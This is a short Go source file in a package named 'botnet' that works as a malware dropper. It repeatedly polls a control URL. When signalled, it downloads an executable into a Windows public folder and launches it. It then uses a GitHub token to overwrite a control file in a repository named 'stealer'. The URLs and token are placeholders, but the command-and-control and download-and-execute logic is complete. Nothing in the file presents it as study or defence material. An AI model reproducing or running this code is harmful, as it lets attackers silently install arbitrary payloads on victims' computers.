package botnet

import (
	"context"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/google/go-github/github"
	"golang.org/x/oauth2"
)

func Run() {
	for {
		checkURL := "e"
		downloadURL := "e"
		value, err := checkValue(checkURL)
		if err != nil {

			return
		}

		if value == 1 {
			err := downloadFile(downloadURL, "C:\\Users\\Public\\Libraries\\proga.exe")
			if err != nil {

			} else {

				err := runFile("C:\\Users\\Public\\Libraries\\proga.exe")
				if err != nil {

				}
				test()
			}
		} else {

		}

		time.Sleep(5 * time.Minute)
	}
}

func checkValue(url string) (int, error) {
	resp, err := http.Get(url)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()

	var value int
	_, err = fmt.Fscan(resp.Body, &value)
	if err != nil {
		return 0, err
	}
	return value, nil
}

func downloadFile(url string, filepath string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func runFile(filepath string) error {
	cmd := exec.Command(filepath)
	return cmd.Start()
}
func test() {

	token := "git token"

	ctx := context.Background()
	ts := oauth2.StaticTokenSource(
		&oauth2.Token{AccessToken: token},
	)
	tc := oauth2.NewClient(ctx, ts)

	client := github.NewClient(tc)

	owner := "meLdozyk"
	repo := "stealer"
	filePath := "t"
	commitMessage := "test"
	newContent := "0"

	file, _, _, err := client.Repositories.GetContents(ctx, owner, repo, filePath, nil)
	if err != nil {
		log.Fatalf("Err: %v", err)
	}

	options := &github.RepositoryContentFileOptions{
		Message: github.String(commitMessage),
		Content: []byte(newContent),
		SHA:     github.String(*file.SHA),
	}

	_, _, err = client.Repositories.UpdateFile(ctx, owner, repo, filePath, options)
	if err != nil {
		log.Fatal("Err:", err)
	}

}
